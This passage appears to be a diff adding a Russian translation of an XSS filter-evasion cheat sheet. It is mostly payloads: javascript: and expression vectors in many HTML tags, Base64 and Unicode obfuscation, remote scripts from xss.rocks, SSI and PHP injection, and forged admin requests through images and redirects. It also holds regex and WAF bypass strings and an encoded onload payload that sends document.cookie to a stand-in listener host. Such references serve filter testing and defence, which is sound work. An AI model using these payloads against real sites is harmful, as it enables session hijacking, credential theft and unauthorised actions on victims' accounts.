+<div class="cheatsheet-code-window"><pre><code class="language-xml">&lt;STYLE&gt;.XSS{background-image:url("javascript:alert('XSS')");}&lt;/STYLE&gt;&lt;A CLASS=XSS&gt;&lt;/A&gt;</code></pre></div>
+<h3 id="style-tag-using-background">Тег STYLE и свойство background</h3>
+
+<div class="cheatsheet-code-window"><pre><code class="language-xml">&lt;STYLE type="text/css"&gt;BODY{background:url("javascript:alert('XSS')")}&lt;/STYLE&gt;
+&lt;STYLE type="text/css"&gt;BODY{background:url("&lt;javascript:alert&gt;('XSS')")}&lt;/STYLE&gt;</code></pre></div>
+<h3 id="anonymous-html-with-style-attribute">Произвольный тег с атрибутом STYLE</h3>
+
+<p>Движок IE не проверяет существование тега: достаточно «&lt;» и буквы:</p>
+
+<div class="cheatsheet-code-window"><pre><code class="language-xml">&lt;XSS STYLE="xss:expression(alert('XSS'))"&gt;</code></pre></div>
+<h3 id="local-htc-file">Локальный файл .htc</h3>
+
+<p>Отличается тем, что нужен .htc на том же сервере, что и вектор. Файл подключает JavaScript и выполняет его в составе атрибута style:</p>
+
+<div class="cheatsheet-code-window"><pre><code class="language-xml">&lt;XSS STYLE="behavior: url(xss.htc);"&gt;</code></pre></div>
+<h3 id="us-ascii-encoding">Кодировка US-ASCII</h3>
+
+<p>Атака использует «искажённый» ASCII: 7 бит вместо 8. Может обходить ряд контент-фильтров, но только если узел отдаёт US-ASCII или кодировка задана явно. Полезнее для обхода WAF, чем для серверных фильтров. Известный сервер с передачей в US-ASCII по умолчанию — Apache Tomcat.</p>
+
+<div class="cheatsheet-code-window"><pre><code class="language-xml">¼script¾alert(¢XSS¢)¼/script¾</code></pre></div>
+<h3 id="meta">META</h3>
+
+<p>Особенность meta refresh — отсутствие Referer в заголовке; удобно для атак, где нужно скрыть исходный URL:</p>
+
+<div class="cheatsheet-code-window"><pre><code class="language-xml">&lt;META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');"&gt;</code></pre></div>
+<h4 id="meta-using-data">META и схема data:</h4>
+
+<p>Схема URL data:. В тексте нет слова SCRIPT и директивы JavaScript — используется Base64. Подробности — <a href="https://datatracker.ietf.org/doc/html/rfc2397">RFC 2397</a>.</p>
+
+<div class="cheatsheet-code-window"><pre><code class="language-xml">&lt;META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K"&gt;</code></pre></div>
+<h4 id="meta-with-additional-url-parameter">META с дополнительным параметром URL</h4>
+
+<p>Если сайт проверяет наличие <code>&lt;http://&gt;;</code> в начале URL, правило обходится так:</p>
+
+<div class="cheatsheet-code-window"><pre><code class="language-xml">&lt;META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('XSS');"&gt;</code></pre></div>
+<p>(Moritz Naumann.)</p>
+
+<h3 id="iframe">IFRAME</h3>
+
+<p>Если iframe разрешены, открывается много других вариантов XSS:</p>
+
+<div class="cheatsheet-code-window"><pre><code class="language-xml">&lt;IFRAME SRC="javascript:alert('XSS');"&gt;&lt;/IFRAME&gt;</code></pre></div>
+<h3 id="iframe-event-based">IFRAME по событиям</h3>
+
+<p>У iframe и большинства элементов возможны обработчики событий, например:</p>
+
+<div class="cheatsheet-code-window"><pre><code class="language-xml">&lt;IFRAME SRC=# onmouseover="alert(document.cookie)"&gt;&lt;/IFRAME&gt;</code></pre></div>
+<p>(David Cross.)</p>
+
+<h3 id="frame">FRAME</h3>
+
+<p>У frame те же классы XSS, что у iframe</p>
+
+<div class="cheatsheet-code-window"><pre><code class="language-xml">&lt;FRAMESET&gt;&lt;FRAME SRC="javascript:alert('XSS');"&gt;&lt;/FRAMESET&gt;</code></pre></div>
+<h3 id="table">Таблица TABLE</h3>
+
+<div class="cheatsheet-code-window"><pre><code class="language-xml">&lt;TABLE BACKGROUND="javascript:alert('XSS')"&gt;</code></pre></div>
+<h4 id="td">TD</h4>
+
+<p>Аналогично: у TD уязвим атрибут BACKGROUND с JavaScript в XSS:</p>
+
+<div class="cheatsheet-code-window"><pre><code class="language-xml">&lt;TABLE&gt;&lt;TD BACKGROUND="javascript:alert('XSS')"&gt;</code></pre></div>
+<h3 id="div">DIV</h3>
+
+<h4 id="div-background-image">DIV и background-image</h4>
+
+<div class="cheatsheet-code-window"><pre><code class="language-xml">&lt;DIV STYLE="background-image: url(javascript:alert('XSS'))"&gt;</code></pre></div>
+<h4 id="div-background-image-with-unicode-xss-exploit">DIV background-image и Unicode-XSS</h4>
+
+<p>Слегка изменено для обфускации параметра URL:</p>
+
+<div class="cheatsheet-code-window"><pre><code class="language-xml">&lt;DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029"&gt;</code></pre></div>
+<p>(Исходная уязвимость — Renaud Lifchitz, Hotmail.)</p>
+
+<h4 id="div-background-image-plus-extra-characters">DIV background-image с лишними символами</h4>
+
+<p>RSnake собрал быстрый XSS-фаззер для символов, допустимых в IE после «(» и до директивы JavaScript. Ниже десятичные коды; допускаются hex и дополнение. (В том числе коды 1–32, 34, 39, 160, 8192–8203, 12288, 65279):</p>
+
+<div class="cheatsheet-code-window"><pre><code class="language-xml">&lt;DIV STYLE="background-image: url(javascript:alert('XSS'))"&gt;</code></pre></div>
+<h4 id="div-expression">DIV и expression</h4>
+
+<p>Вариант сработал против реального XSS-фильтра за счёт перевода строки между двоеточием и <code>expression</code>:</p>
+
+<div class="cheatsheet-code-window"><pre><code class="language-xml">&lt;DIV STYLE="width: expression(alert('XSS'));"&gt;</code></pre></div>
+<h3 id="downlevel-hidden-block">Блок Downlevel-Hidden</h3>
+
+<p>Только Trident (IE). Некоторые сайты считают содержимое комментариев безопасным и не удаляют его — открывается место для вектора. Либо система оборачивает фрагмент в комментарии в надежде обезвредить — как видно, это не гарантия:</p>
+
+<div class="cheatsheet-code-window"><pre><code class="language-xml">&lt;!--[if gte IE 4]&gt;
+&lt;SCRIPT&gt;alert('XSS');&lt;/SCRIPT&gt;
+&lt;![endif]--&gt;</code></pre></div>
+<h3 id="base-tag">Тег BASE</h3>
+
+<p>(IE в безопасном режиме.) Нужен <code>//</code>, чтобы закомментировать хвост и избежать ошибки JavaScript, тогда тег XSS отрисуется. Опирается на относительные пути картинок вроде <code>images/image.jpg</code> без полного URL. При пути с ведущим слэшем <code>/images/image.jpg</code> один слэш из вектора можно убрать (для комментария по-прежнему нужны два слэша):</p>
+
+<div class="cheatsheet-code-window"><pre><code class="language-xml">&lt;BASE HREF="javascript:alert('XSS');//"&gt;</code></pre></div>
+<h3 id="object-tag">Тег OBJECT</h3>
+
+<p>При разрешённых объектах возможны и другие нагрузки (в т.ч. через APPLET). Связанный файл может быть HTML с вложенным XSS:</p>
+
+<div class="cheatsheet-code-window"><pre><code class="language-xml">&lt;OBJECT TYPE="text/x-scriptlet" DATA="http://xss.rocks/scriptlet.html"&gt;&lt;/OBJECT&gt;</code></pre></div>
+<h3 id="embed-svg-which-contains-xss-vector">EMBED SVG с вектором XSS</h3>
+
+<p>Только Firefox:</p>
+
+<div class="cheatsheet-code-window"><pre><code class="language-xml">&lt;EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"&gt;&lt;/EMBED&gt;</code></pre></div>
+<p>(nEUrOO.)</p>
+
+<h3 id="xml-data-island-with-cdata-obfuscation">XML Data Island и обфускация CDATA</h3>
+
+<p>Только IE:</p>
+
+<div class="cheatsheet-code-window"><pre><code class="language-xml">&lt;XML ID="xss"&gt;&lt;I&gt;&lt;B&gt;&lt;IMG SRC="javas&lt;!-- --&gt;cript:alert('XSS')"&gt;&lt;/B&gt;&lt;/I&gt;&lt;/XML&gt;
+&lt;SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"&gt;&lt;/SPAN&gt;</code></pre></div>
+<h3 id="locally-hosted-xml-with-embedded-javascript-that-is-generated-using-an-xml-data-island">Локальный XML с JavaScript через XML data island</h3>
+
+<p>Почти то же, но вектор хранится в XML на том же сервере. Результат:</p>
+
+<div class="cheatsheet-code-window"><pre><code class="language-xml">&lt;XML SRC="xsstest.xml" ID=I&gt;&lt;/XML&gt;
+&lt;SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML&gt;&lt;/SPAN&gt;</code></pre></div>
+<h3 id="htmltime-in-xml">HTML+TIME в XML</h3>
+
+<p>Только IE; конструкция должна находиться между тегами HTML и BODY:</p>
+
+<div class="cheatsheet-code-window"><pre><code class="language-xml">&lt;HTML&gt;&lt;BODY&gt;
+&lt;?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"&gt;
+&lt;?import namespace="t" implementation="#default#time2"&gt;
+&lt;t:set attributeName="innerHTML" to="XSS&lt;SCRIPT DEFER&gt;alert("XSS")&lt;/SCRIPT&gt;"&gt;
+&lt;/BODY&gt;&lt;/HTML&gt;</code></pre></div>
+<p>(Так Grey Magic атаковали Hotmail и Yahoo!)</p>
+
+<h3 id="assuming-you-can-only-fit-in-a-few-characters-and-it-filters-against-js">Мало символов и фильтр по <code>.js</code></h3>
+
+<p>Файл сценария можно выдать за изображение:</p>
+
+<div class="cheatsheet-code-window"><pre><code class="language-xml">&lt;SCRIPT SRC="http://xss.rocks/xss.jpg"&gt;&lt;/SCRIPT&gt;</code></pre></div>
+<h3 id="ssi-server-side-includes">SSI (Server Side Includes)</h3>
+
+<p>Нужен SSI на сервере. Если доступны команды на сервере, проблема, как правило, серьёзнее XSS:</p>
+
+<div class="cheatsheet-code-window"><pre><code class="language-xml">&lt;!--#exec cmd="/bin/echo '&lt;SCR'"--&gt;&lt;!--#exec cmd="/bin/echo 'IPT SRC=http://xss.rocks/xss.js&gt;&lt;/SCRIPT&gt;'"--&gt;</code></pre></div>
+<h3 id="php">PHP</h3>
+
+<p>Нужен PHP на сервере. Удалённое выполнение сценариев — обычно уже критичнее XSS:</p>
+
+<div class="cheatsheet-code-window"><pre><code class="language-php">&lt;? echo('&lt;SCR)';
+echo('IPT&gt;alert("XSS")&lt;/SCRIPT&gt;'); ?&gt;</code></pre></div>
+<h3 id="img-embedded-commands">IMG и встроенные команды</h3>
+
+<p>Срабатывает при внедрении (например в форум) на страницу под паролем, если та же защита распространяется на другие команды того же домена. Возможны удаление и создание пользователей (если жертва — администратор), утечка учётных данных и т.д. Редко используемый, но сильный вектор XSS:</p>
+
+<div class="cheatsheet-code-window"><pre><code class="language-xml">&lt;IMG SRC="http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode"&gt;</code></pre></div>
+<h4 id="img-embedded-commands-part-ii">IMG и встроенные команды, часть II</h4>
+
+<p>Опаснее тем, что внешне почти неотличимо от обычной картинки с чужого домена. Вектор использует 302 или 304 (подойдут и другие коды), перенаправляя «изображение» на URL команды. Обычный <code>&lt;IMG SRC="httx://badguy.com/a.jpg"&gt;</code> может выполнить действия от имени пользователя, открывшего страницу. Пример строки <code>.htaccess</code> (Apache):</p>
+
+<div class="cheatsheet-code-window"><pre><code class="language-xml">Redirect 302 /a.jpg http://victimsite.com/admin.asp&amp;deleteuser</code></pre></div>
+<p>(Часть — Timo.)</p>
+
+<h3 id="cookie-manipulation">Манипуляция cookie</h3>
+
+<p>Редкий сценарий: разрешён <code>&lt;META</code> и им можно перезаписать cookie. На части сайтов имя пользователя берётся не из БД, а из cookie и показывается посетителю. Сочетание позволяет подменить cookie жертвы так, что при отображении выполнится JavaScript (также возможны выход из сессии, смена состояния, принуждение к входу под другой учётной записью и т.п.):</p>
+
+<div class="cheatsheet-code-window"><pre><code class="language-xml">&lt;META HTTP-EQUIV="Set-Cookie" Content="USERID=&lt;SCRIPT&gt;alert('XSS')&lt;/SCRIPT&gt;"&gt;</code></pre></div>
+<h3 id="xss-using-html-quote-encapsulation">XSS с обходом кавычек HTML</h3>
+
+<p>Изначально проверялось в IE; в других браузерах поведение может отличаться. Если разрешён <code>&lt;SCRIPT&gt;</code>, но запрещён <code>&lt;SCRIPT SRC...</code> фильтром <code>/\&lt;script\[^\&gt;\]+src/i</code>:</p>
+
+<div class="cheatsheet-code-window"><pre><code class="language-xml">&lt;SCRIPT a="&gt;" SRC="httx://xss.rocks/xss.js"&gt;&lt;/SCRIPT&gt;</code></pre></div>
+<p>Если запрещён <code>\&lt;script src...</code> фильтром <code>/\&lt;script((\\s+\\w+(\\s\*=\\s\*(?:"(.)\*?"|'(.)\*?'|\[^'"\&gt;\\s\]+))?)+\\s\*|\\s\*)src/i</code> (важный случай — такой шаблон встречался в продакшене):</p>
+
+<div class="cheatsheet-code-window"><pre><code class="language-xml">&lt;SCRIPT ="&gt;" SRC="httx://xss.rocks/xss.js"&gt;&lt;/SCRIPT&gt;</code></pre></div>
+<p>Ещё один обход того же фильтра <code>/\&lt;script((\\s+\\w+(\\s\*=\\s\*(?:"(.)\*?"|'(.)\*?'|\[^'"\&gt;\\s\]+))?)+\\s\*|\\s\*)src/i</code>:</p>
+
+<div class="cheatsheet-code-window"><pre><code class="language-xml">&lt;SCRIPT a="&gt;" '' SRC="httx://xss.rocks/xss.js"&gt;&lt;/SCRIPT&gt;</code></pre></div>
+<p>Ещё один вариант обхода: <code>/\&lt;script((\\s+\\w+(\\s\*=\\s\*(?:"(.)\*?"|'(.)\*?'|\[^'"\&gt;\\s\]+))?)+\\s\*|\\s\*)src/i</code></p>
+
+<p>Раздел не про противодействие; остановить именно этот пример при допустимых <code>&lt;SCRIPT&gt;</code> и запрете удалённых сценариев можно лишь полноценным разбором (конечный автомат); при разрешённых <code>&lt;SCRIPT&gt;</code> иные обходы всё равно возможны:</p>
+
+<div class="cheatsheet-code-window"><pre><code class="language-xml">&lt;SCRIPT "a='&gt;'" SRC="httx://xss.rocks/xss.js"&gt;&lt;/SCRIPT&gt;</code></pre></div>
+<p>Последний обход <code>/\&lt;script((\\s+\\w+(\\s\*=\\s\*(?:"(.)\*?"|'(.)\*?'|\[^'"\&gt;\\s\]+))?)+\\s\*|\\s\*)src/i</code> с grave accent (в Firefox не работает):</p>
+
+<!-- markdownlint-disable MD038-->
+
+<div class="cheatsheet-code-window"><pre><code class="language-xml">&lt;SCRIPT a=`&gt;` SRC="httx://xss.rocks/xss.js"&gt;&lt;/SCRIPT&gt;</code></pre></div>
+<!-- markdownlint-enable MD038-->
+
+
+<p>Пример XSS, если регулярное выражение ищет любую кавычку для «закрытия» параметра, а не парную:</p>
+
+<div class="cheatsheet-code-window"><pre><code class="language-xml">&lt;SCRIPT a="&gt;'&gt;" SRC="httx://xss.rocks/xss.js"&gt;&lt;/SCRIPT&gt;</code></pre></div>
+<p>Сложно заблокировать без запрета всего активного контента:</p>
+
+<div class="cheatsheet-code-window"><pre><code class="language-xml">&lt;SCRIPT&gt;document.write("&lt;SCRI");&lt;/SCRIPT&gt;PT SRC="httx://xss.rocks/xss.js"&gt;&lt;/SCRIPT&gt;</code></pre></div>
+<h3 id="url-string-evasion">Обход проверки строки URL</h3>
+
+<p>Ниже — если <code>http://www.google.com/</code> запрещён программно:</p>
+
+<h4 id="ip-versus-hostname">IP вместо имени хоста</h4>
+
+<div class="cheatsheet-code-window"><pre><code class="language-xml">&lt;A HREF="http://66.102.7.147/"&gt;XSS&lt;/A&gt;</code></pre></div>
+<h4 id="url-encoding">Кодирование URL</h4>
+
+<div class="cheatsheet-code-window"><pre><code class="language-xml">&lt;A HREF="http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D"&gt;XSS&lt;/A&gt;</code></pre></div>
+<h4 id="dword-encoding">Кодирование DWORD</h4>
+
+<p>Возможны и другие варианты записи DWORD; подробности — в калькуляторах обфускации IP.</p>
+
+<div class="cheatsheet-code-window"><pre><code class="language-xml">&lt;A HREF="http://1113982867/"&gt;XSS&lt;/A&gt;</code></pre></div>
+<h4 id="hex-encoding">Шестнадцатеричное кодирование</h4>
+
+<p>Длина каждого числа ограничена (порядка 240 символов суммарно; видно по второй цифре). Для hex 0–F ведущий ноль в третьей группе не обязателен:</p>
+
+<div class="cheatsheet-code-window"><pre><code class="language-xml">&lt;A HREF="http://0x42.0x0000066.0x7.0x93/"&gt;XSS&lt;/A&gt;</code></pre></div>
+<h4 id="octal-encoding">Восьмеричное кодирование</h4>
+
+<p>Допускается дополнение нулями; на октет следует оставить не менее 4 символов в каждом «классе» (A, B и т.д.):</p>
+
+<div class="cheatsheet-code-window"><pre><code class="language-xml">&lt;A HREF="http://0102.0146.0007.00000223/"&gt;XSS&lt;/A&gt;</code></pre></div>
+<h4 id="base64-encoding">Кодирование Base64</h4>
+
+<div class="cheatsheet-code-window"><pre><code class="language-xml">&lt;img onload="eval(atob('ZG9jdW1lbnQubG9jYXRpb249Imh0dHA6Ly9saXN0ZXJuSVAvIitkb2N1bWVudC5jb29raWU='))"&gt;</code></pre></div>
+<h4 id="mixed-encoding">Смешанное кодирование</h4>
+
+<p>Сочетание систем счисления плюс табуляции и переводы строк (браузеры это принимают). Табы и переводы строк работают только внутри кавычек:</p>
+
+<!-- markdownlint-disable MD010-->
+
+<div class="cheatsheet-code-window"><pre><code class="language-xml">&lt;A HREF="h
+tt  p://6   6.000146.0x7.147/"&gt;XSS&lt;/A&gt;</code></pre></div>
+<!-- markdownlint-enable MD010-->
+
+
+<h4 id="protocol-resolution-bypass">Обход разрешения протокола</h4>
+
+<p><code>//</code> разрешается как <code>http://</code> — экономия символов при лимите длины и обход регулярных выражений вроде <code>(ht|f)tp(s)?://</code> (часть идеи — Ozh). Вместо <code>//</code> можно <code>\\\\</code>. Слэши нужно сохранить, иначе URL станет относительным:</p>
+
+<div class="cheatsheet-code-window"><pre><code class="language-xml">&lt;A HREF="//www.google.com/"&gt;XSS&lt;/A&gt;</code></pre></div>
+<h4 id="removing-cnames">Без префикса www</h4>
+
+<p>Вместе с приёмом выше отказ от <code>www.</code> экономит ещё 4 байта (до 9 суммарно на корректно настроенных серверах):</p>
+
+<div class="cheatsheet-code-window"><pre><code class="language-xml">&lt;A HREF="http://google.com/"&gt;XSS&lt;/A&gt;</code></pre></div>
+<p>Лишняя точка для «абсолютного» DNS:</p>
+
+<div class="cheatsheet-code-window"><pre><code class="language-xml">&lt;A HREF="http://www.google.com./"&gt;XSS&lt;/A&gt;</code></pre></div>
+<h4 id="javascript-link-location">Переход через JavaScript</h4>
+
+<div class="cheatsheet-code-window"><pre><code class="language-xml">&lt;A HREF="javascript:document.location='http://www.google.com/'"&gt;XSS&lt;/A&gt;</code></pre></div>
+<h4 id="content-replace-as-attack-vector">Подмена содержимого как вектор атаки</h4>
+
+<!-- markdownlint-disable MD010-->
+
+<p>Допустим, <code>http://www.google.com/</code> программно вырезается. Похожий вектор применяли к нескольким реальным XSS-фильтрам: сам фильтр преобразований помогает собрать атаку — например <code>java&amp;\#x09;script:</code> превращается в <code>java    script:</code>, что в IE интерпретируется как протокол:</p>
+
+<!-- markdownlint-enable MD010-->
+
+
+<div class="cheatsheet-code-window"><pre><code class="language-xml">&lt;A HREF="http://www.google.com/ogle.com/"&gt;XSS&lt;/A&gt;</code></pre></div>
+<h3 id="assisting-xss-with-http-parameter-pollution">Усиление XSS за счёт HTTP Parameter Pollution</h3>
+
+<p>При реализации потока «поделиться» как ниже атака возможна. Страница <code>Content</code> показывает пользовательский контент и ссылку на <code>Share</code>, где выбирается площадка для публикации. Разработчики кодируют параметр <code>title</code> для HTML на странице <code>Content</code>, чтобы снизить риск XSS, но не кодируют его для URL и не защищаются от HPP. Параметр <code>content_type</code> считается константой-целым, поэтому на странице <code>Share</code> его не кодируют и не проверяют.</p>
+
+<h4 id="content-page-source-code">Исходный код страницы Content</h4>
+
+<div class="cheatsheet-code-window"><pre><code class="language-xml">a href="/Share?content_type=1&amp;title=&lt;%=Encode.forHtmlAttribute(untrusted content title)%&gt;"&gt;Share&lt;/a&gt;</code></pre></div>
+<h4 id="share-page-source-code">Исходный код страницы Share</h4>
+
+<div class="cheatsheet-code-window"><pre><code class="language-javascript">&lt;script&gt;
+var contentType = &lt;%=Request.getParameter("content_type")%&gt;;
+var title = "&lt;%=Encode.forJavaScript(request.getParameter("title"))%&gt;";
+...
+// здесь могут быть пользовательское соглашение и логика отправки на сервер
+...
+&lt;/script&gt;</code></pre></div>
+<h4 id="content-page-output">Вывод страницы Content</h4>
+
+<p>Если атакующий задаёт небезопасный заголовок <code>This is a regular title&amp;content_type=1;alert(1)</code>, ссылка на <code>Content</code> станет такой:</p>
+
+<div class="cheatsheet-code-window"><pre><code class="language-xml">&lt;a href="/share?content_type=1&amp;title=This is a regular title&amp;amp;content_type=1;alert(1)"&gt;Share&lt;/a&gt;</code></pre></div>
+<h4 id="share-page-output">Вывод страницы Share</h4>
+
+<p>На странице Share в разметке может оказаться:</p>
+
+<div class="cheatsheet-code-window"><pre><code class="language-javascript">&lt;script&gt;
+var contentType = 1; alert(1);
+var title = "This is a regular title";
+…
+// здесь могут быть пользовательское соглашение и логика отправки на сервер
+…
+&lt;/script&gt;</code></pre></div>
+<p>Итог: основной недостаток — доверие к <code>content_type</code> на <code>Share</code> без кодирования и проверки входных данных. HPP может повысить влияние XSS: от отражённого к сохранённому.</p>
+
+<h2 id="character-escape-sequences">Экранирующие последовательности символов</h2>
+
+<p>Варианты записи символа <code>\&lt;</code> в HTML и JavaScript. Большинство сами по себе не отображаются, но в ряде условий (как выше) могут быть разобраны браузером.</p>
+
+<ul>
+<li><code>&lt;</code></li>
+<li><code>%3C</code></li>
+<li><code>&amp;lt</code></li>
+<li><code>&amp;lt;</code></li>
+<li><code>&amp;LT</code></li>
+<li><code>&amp;LT;</code></li>
+<li><code>&amp;#60;</code></li>
+<li><code>&amp;#060;</code></li>
+<li><code>&amp;#0060;</code></li>
+<li><code>&amp;#00060;</code></li>
+<li><code>&amp;#000060;</code></li>
+<li><code>&amp;#0000060;</code></li>
+<li><code>&amp;#60;</code></li>
+<li><code>&amp;#060;</code></li>
+<li><code>&amp;#0060;</code></li>
+<li><code>&amp;#00060;</code></li>
+<li><code>&amp;#000060;</code></li>
+<li><code>&amp;#0000060;</code></li>
+<li><code>&amp;#x3c;</code></li>
+<li><code>&amp;#x03c;</code></li>
+<li><code>&amp;#x003c;</code></li>
+<li><code>&amp;#x0003c;</code></li>
+<li><code>&amp;#x00003c;</code></li>
+<li><code>&amp;#x000003c;</code></li>
+<li><code>&amp;#x3c;</code></li>
+<li><code>&amp;#x03c;</code></li>
+<li><code>&amp;#x003c;</code></li>
+<li><code>&amp;#x0003c;</code></li>
+<li><code>&amp;#x00003c;</code></li>
+<li><code>&amp;#x000003c;</code></li>
+<li><code>&amp;#X3c;</code></li>
+<li><code>&amp;#X03c;</code></li>
+<li><code>&amp;#X003c;</code></li>
+<li><code>&amp;#X0003c;</code></li>
+<li><code>&amp;#X00003c;</code></li>
+<li><code>&amp;#X000003c;</code></li>
+<li><code>&amp;#X3c;</code></li>
+<li><code>&amp;#X03c;</code></li>
+<li><code>&amp;#X003c;</code></li>
+<li><code>&amp;#X0003c;</code></li>
+<li><code>&amp;#X00003c;</code></li>
+<li><code>&amp;#X000003c;</code></li>
+<li><code>&amp;#x3C;</code></li>
+<li><code>&amp;#x03C;</code></li>
+<li><code>&amp;#x003C;</code></li>
+<li><code>&amp;#x0003C;</code></li>
+<li><code>&amp;#x00003C;</code></li>
+<li><code>&amp;#x000003C;</code></li>
+<li><code>&amp;#x3C;</code></li>
+<li><code>&amp;#x03C;</code></li>
+<li><code>&amp;#x003C;</code></li>
+<li><code>&amp;#x0003C;</code></li>
+<li><code>&amp;#x00003C;</code></li>
+<li><code>&amp;#x000003C;</code></li>
+<li><code>&amp;#X3C;</code></li>
+<li><code>&amp;#X03C;</code></li>
+<li><code>&amp;#X003C;</code></li>
+<li><code>&amp;#X0003C;</code></li>
+<li><code>&amp;#X00003C;</code></li>
+<li><code>&amp;#X000003C;</code></li>
+<li><code>&amp;#X3C;</code></li>
+<li><code>&amp;#X03C;</code></li>
+<li><code>&amp;#X003C;</code></li>
+<li><code>&amp;#X0003C;</code></li>
+<li><code>&amp;#X00003C;</code></li>
+<li><code>&amp;#X000003C;</code></li>
+<li><code>\x3c</code></li>
+<li><code>\x3C</code></li>
+<li><code>\u003c</code></li>
+<li><code>\u003C</code></li>
+</ul>
+
+<h2 id="methods-to-bypass-waf-cross-site-scripting">Обход WAF при XSS</h2>
+
+<h3 id="general-issues">Общие замечания</h3>
+
+<h4 id="stored-xss">Stored XSS</h4>
+
+<p>Если атакующий провёл XSS через фильтр, WAF не помешает дальнейшему выполнению атаки.</p>
+
+<h4 id="reflected-xss-in-javascript">Отражённый XSS в JavaScript</h4>
+
+<p>Пример:</p>
+
+<div class="cheatsheet-code-window"><pre><code class="language-xml">&lt;script&gt; ... setTimeout(\\"writetitle()\\",$\_GET\[xss\]) ... &lt;/script&gt;</code></pre></div>
+<p>Эксплуатация:</p>
+
+<div class="cheatsheet-code-window"><pre><code class="language-xml">/?xss=500); alert(document.cookie);//</code></pre></div>
+<h4 id="dom-based-xss">DOM-based XSS</h4>
+
+<p>Пример:</p>
+
+<div class="cheatsheet-code-window"><pre><code class="language-javascript">&lt;script&gt; ... eval($\_GET\[xss\]); ... &lt;/script&gt;</code></pre></div>
+<p>Эксплуатация:</p>
+
+<div class="cheatsheet-code-window"><pre><code class="language-xml">/?xss=document.cookie</code></pre></div>
+<h4 id="xss-via-request-redirection">XSS через перенаправление запроса</h4>
+
+<p>Уязвимый код:</p>
+
+<div class="cheatsheet-code-window"><pre><code class="language-xml">...
+header('Location: '.$_GET['param']);
+...</code></pre></div>
+<p>Также:</p>
+
+<div class="cheatsheet-code-window"><pre><code class="language-xml">...
+header('Refresh: 0; URL='.$_GET['param']);
+...</code></pre></div>
+<p>Такой запрос WAF отсечёт:</p>
+
+<div class="cheatsheet-code-window"><pre><code class="language-xml">/?param=&lt;javascript:alert(document.cookie&gt;)</code></pre></div>
+<p>Такой запрос пройдёт WAF, а XSS выполнится в ряде браузеров:</p>
+
+<div class="cheatsheet-code-window"><pre><code class="language-xml">/?param=&lt;data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=</code></pre></div>
+<h3 id="waf-bypass-strings-for-xss">Строки обхода WAF для XSS</h3>
+
+<!-- markdownlint-disable MD038-->
+
+<ul>
+<li><code>&lt;Img src = x onerror = "javascript: window.onerror = alert; throw XSS"&gt;</code></li>
+<li><code>&lt;Video&gt; &lt;source onerror = "javascript: alert (XSS)"&gt;</code></li>
+<li><code>&lt;Input value = "XSS" type = text&gt;</code></li>
+<li><code>&lt;applet code="javascript:confirm(document.cookie);"&gt;</code></li>
+<li><code>&lt;isindex x="javascript:" onmouseover="alert(XSS)"&gt;</code></li>
+<li><code>"&gt;&lt;/SCRIPT&gt;”&gt;’&gt;&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt;</code></li>
+<li><code>"&gt;&lt;img src="x:x" onerror="alert(XSS)"&gt;</code></li>
+<li><code>"&gt;&lt;iframe src="javascript:alert(XSS)"&gt;</code></li>
+<li><code>&lt;object data="javascript:alert(XSS)"&gt;</code></li>
+<li><code>&lt;isindex type=image src=1 onerror=alert(XSS)&gt;</code></li>
+<li><code>&lt;img src=x:alert(alt) onerror=eval(src) alt=0&gt;</code></li>
+<li><code>&lt;img  src="x:gif" onerror="window['al\u0065rt'](0)"&gt;&lt;/img&gt;</code></li>
+<li><code>&lt;iframe/src="data:text/html,&lt;svg onload=alert(1)&gt;"&gt;</code></li>
+<li><code>&lt;meta content="&amp;NewLine; 1 &amp;NewLine;; JAVASCRIPT&amp;colon; alert(1)" http-equiv="refresh"/&gt;</code></li>
+<li><code>&lt;svg&gt;&lt;script xlink:href=data&amp;colon;,window.open('https://www.google.com/')&gt;&lt;/script</code></li>
+<li><code>&lt;meta http-equiv="refresh" content="0;url=javascript:confirm(1)"&gt;</code></li>
+<li><code>&lt;iframe src=javascript&amp;colon;alert&amp;lpar;document&amp;period;location&amp;rpar;&gt;</code></li>
+<li><code>&lt;form&gt;&lt;a href="javascript:\u0061lert(1)"&gt;X</code></li>
+<li><code>&lt;/script&gt;&lt;img/*%00/src="worksinchrome&amp;colon;prompt(1)"/%00*/onerror='eval(src)'&gt;</code></li>
+<li><code>&lt;style&gt;//*{x:expression(alert(/xss/))}//&lt;style&gt;&lt;/style&gt;</code></li>
+</ul>
+
+<p>При наведении мыши:</p>
+
+<ul>
+<li><code>&lt;img src="/" =_=" title="onerror='prompt(1)'"&gt;</code></li>
+<li><code>&lt;a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&amp;#97v&amp;#97script:&amp;#97lert(1)&gt;ClickMe</code></li>
+<li><code>&lt;script x&gt; alert(1) &lt;/script 1=2</code></li>
+<li><code>&lt;form&gt;&lt;button formaction=javascript&amp;colon;alert(1)&gt;CLICKME</code></li>
+<li><code>&lt;input/onmouseover="javaSCRIPT&amp;colon;confirm&amp;lpar;1&amp;rpar;"</code></li>
